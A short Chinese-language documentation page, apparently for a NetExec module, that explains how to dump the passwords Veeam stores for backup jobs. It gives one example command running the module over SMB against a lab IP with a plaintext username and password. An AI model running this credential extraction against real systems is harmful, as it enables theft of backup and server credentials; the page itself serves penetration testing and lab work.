---
description: 导出 Veeam 用于备份作业的密码
---

# 导出 Veeam

{% hint style="warning" %}
你需要在远程目标上至少具有本地管理员权限，如果你的用户是本地账户，请使用 **--local-auth** 选项
{% endhint %}

Veeam 将用于备份作业的服务器和客户端凭证存储在 SQL 数据库中。在大多数配置中，这个 SQL 数据库与 veeam 服务器在同一系统上。如果不是这种情况，该模块可能无法工作。如果模块发现了 veeam 安装但无法成功提取凭证，请在 github 上提出问题。

```
nxc smb 192.168.56.22 -u eddard.stark -p FightP3aceAndHonor! -M veeam
```

